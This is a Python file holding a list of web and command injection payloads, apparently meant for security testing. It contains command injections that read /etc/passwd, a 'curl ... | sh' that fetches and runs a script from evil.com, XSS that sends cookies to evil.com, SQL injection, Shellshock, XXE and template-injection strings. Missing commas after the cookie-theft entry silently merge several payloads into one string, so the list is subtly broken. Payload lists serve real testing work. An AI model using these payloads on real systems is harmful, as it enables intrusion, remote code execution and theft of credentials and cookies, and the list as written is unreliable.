# -*- coding: utf-8 -*-
code_injection_payloads = [
    "; import os; os.system('whoami')",
    "; import os; os.system('ls')",
    "; import os; os.system('cat /etc/passwd')",
    "; import os; os.system('wget http://evil.com/malicious_file')",
    "; puts `whoami`",
    "; puts `ls`",
    "; puts `cat /etc/passwd`",
    "; puts `curl -O http://evil.com/malicious_file`",
    "<script>alert('XSS')</script>",
    "<script>document.location='http://evil.com/steal_cookies?cookie='+document.cookie</script>"
    "; ls"
    "; cat /etc/passwd"
    "; curl http://evil.com/malicious_script.sh | sh"
    "' or 'a'='a"
    "' or 1=1 or 'a'='a"
    "() { :;}; /bin/sleep 0"
    '''
    <!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
        <userInfo>
         <name>&xxe;</name>
        </userInfo> 
    '''
    '''
    {{ 7*'7' }}
            {{ [].class.baseClasses.class.__subclasses__() }}
    '''
]
